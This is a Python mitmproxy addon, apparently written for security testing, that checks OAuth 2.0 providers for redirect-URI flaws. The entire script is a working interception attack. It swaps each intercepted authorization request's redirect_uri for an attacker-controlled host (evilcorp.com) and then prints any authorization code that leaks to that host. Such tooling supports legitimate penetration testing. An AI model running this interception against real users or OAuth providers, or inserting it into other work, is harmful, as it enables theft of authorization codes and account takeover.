from mitmproxy import http
import urllib.parse

class RedirectUriChecker:
    """
    A mitmproxy addon to test for OAuth 2.0 Redirection URI vulnerabilities.

    This script intercepts outgoing OAuth 2.0 authorization requests and attempts
    to swap the legitimate 'redirect_uri' with an attacker-controlled domain.

    Attributes:
        attacker_domain (str): The domain controlled by the tester to verify redirects.
        evil_redirect_uri (str): The full callback URL injected into intercepted requests.
    """

    def __init__(self):
        """
        Initializes the checker with the target attacker domain and callback URI.
        """
        # TODO: Add more variations based on provided input?
        # TODO: Replace with CLI Arguments

        self.attacker_domain = "evilcorp.com"
        self.evil_redirect_uri = f"https://{self.attacker_domain}/oauth_callback"

    def request(self, flow: http.HTTPFlow) -> None:
        """
        Intersects the HTTP request phase to perform the injection.

        Checks if the current request is an OAuth authorization request by
        looking for required query parameters. If found, it replaces the
        original 'redirect_uri' with the malicious one.

        Args:
            flow (http.HTTPFlow): The current mitmproxy HTTP flow object containing
                                  request and response data.
        """
        if ("client_id" in flow.request.query
                and "response_type" in flow.request.query
                and "redirect_uri" in flow.request.query):

            print(f"\n{'='*20}")
            print("Intercepted OAuth Authorization Request")
            print(f"Original redirect_uri: {flow.request.query['redirect_uri']}")

            # Modify the query parameter in-place
            flow.request.query["redirect_uri"] = self.evil_redirect_uri

            print(f"redirect_uri changed to: {self.evil_redirect_uri}")
            print("Forwarding modified request...")
            print(f"\n{'='*20}")

    def response(self, flow: http.HTTPFlow) -> None:
        """
        Intersects the HTTP response phase to verify the exploit.

        Monitors the server's response for HTTP redirection status codes. If the
        server redirects to the 'attacker_domain', it indicates an Open Redirect
        vulnerability. If an authorization 'code' is present in the redirect URL,
        the exploit is considered successful.

        Args:
            flow (http.HTTPFlow): The current mitmproxy HTTP flow object.
        """
        # Check if the response is a redirect
        if flow.response and flow.response.status_code in (301, 302, 303, 307, 308):
            location = flow.response.headers.get("Location")

            if location:
                parsed_url = urllib.parse.urlparse(location)

                # Verify if the OAuth provider redirected back to our attacker domain
                if self.attacker_domain in parsed_url.netloc:
                    query_params = urllib.parse.parse_qs(parsed_url.query)

                    print("Open Redirect Detected!")
                    print(f"Browser was redirected to: {parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}")

                    # Check if the provider leaked the authorization code to the attacker
                    if "code" in query_params:
                        print(f"Auth Code: {query_params['code'][0]}")

                elif "error" in location:
                    print(f"\n{'='*20}")
                    print("Provider rejected the payload.")
                    print(f"Error from provider: {location}")
                    print(f"\n{'='*20}")


# Register the addon for mitmproxy
addons = [
    RedirectUriChecker()
]